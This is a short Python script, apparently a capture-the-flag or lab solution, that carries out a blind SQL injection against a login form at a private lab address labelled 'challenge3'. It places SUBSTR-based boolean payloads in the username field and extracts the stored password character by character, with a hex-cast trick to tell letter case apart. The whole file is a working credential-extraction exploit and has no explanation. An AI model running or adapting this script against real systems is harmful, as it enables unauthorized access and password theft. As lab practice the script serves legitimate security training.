#!/bin/python3
import requests

ourvar = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%^*()_-+\"{}[]()<>&"

final = ""


def func(payload):
    return requests.post(
        "http://10.10.53.186:5000/challenge3/login",
        data={
            "username": payload,
            "password": 1
        })


for ran in range(1, 38):
    for r in ourvar:
        payload = f"admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),{ran},1) = '{r}'-- -"
        if func(payload).history:
            final += r.lower()
            print(r.lower())
        while r.isupper():
            hexx = r.upper().encode("utf-8").hex()
            payload2 = f"admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),{ran},1) = CAST(X'{hexx}' as Text)-- -"
            if func(payload2).history:
                final += r.upper()
                print(r.upper())
            break

print(final)
